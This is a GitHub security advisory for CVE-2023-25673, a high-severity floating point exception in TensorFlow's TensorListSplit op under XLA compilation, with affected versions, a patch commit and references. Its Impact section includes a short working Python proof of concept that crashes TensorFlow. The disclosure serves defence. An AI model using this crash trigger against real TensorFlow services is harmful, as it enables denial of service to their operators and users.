# [H] TensorFlow has Floating Point Exception in TensorListSplit with XLA 

## Summary
Severity: High
Advisory: GHSA-647v-r7qq-24fh
CVE: CVE-2023-25673
CWE: CWE-697
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-647v-r7qq-24fh
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
FPE in TensorListSplit with XLA 
```python
import tensorflow as tf

func = tf.raw_ops.TensorListSplit
para = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

### Patches
We have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-647v-r7qq-24fh
- https://nvd.nist.gov/vuln/detail/CVE-2023-25673
- https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa
- https://github.com/tensorflow/tensorflow
